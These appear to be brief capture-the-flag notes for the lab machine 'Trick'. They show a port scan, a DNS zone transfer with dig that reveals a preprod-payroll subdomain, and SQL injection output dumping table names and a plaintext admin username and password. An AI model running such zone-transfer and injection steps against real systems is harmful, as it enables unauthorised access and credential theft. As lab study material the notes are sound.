# Enum
```
22 - OpenSSH 7.9p1 Debian 10+deb10u2
25 - Postfix
53 - BIND "9.11.5-P4-5.1+deb10u7-Debian"
80 - nginx 1.14.2 - unconfigured boostrap
```

## DNS Enum
```
(blnkn㉿Kolossus)-[~/sec/htb/machines/trick]─$ nslookup
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.
>
```
```
(blnkn㉿Kolossus)-[~/sec/htb/machines/trick]─$ dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 32 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
 WHEN: Mon Jul 04 23:11:04 IST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

[http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb) has a login page, which is vulnerable to SQli 
![sqli](./sqli.png)


```
Administrator
Enemigosss
SuperGucciRainbowCake
```
```
[22:18:05] [INFO] retrieved: information_schema
[22:18:11] [INFO] retrieved: payroll_db

[22:18:14] [INFO] retrieved: position
[22:18:17] [INFO] retrieved: employee
[22:18:20] [INFO] retrieved: department
[22:18:23] [INFO] retrieved: payroll_items
[22:18:28] [INFO] retrieved: attendance
[22:18:31] [INFO] retrieved: employee_deductions
[22:18:37] [INFO] retrieved: employee_allowances
[22:18:41] [INFO] retrieved: users
[22:18:43] [INFO] retrieved: deductions
[22:18:46] [INFO] retrieved: payroll
[22:18:49] [INFO] retrieved: allowances
```
```
Database: payroll_db
Table: users
[1 entry]
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name           | type | address | contact | password              | username   |
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrateur | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
```
```
```
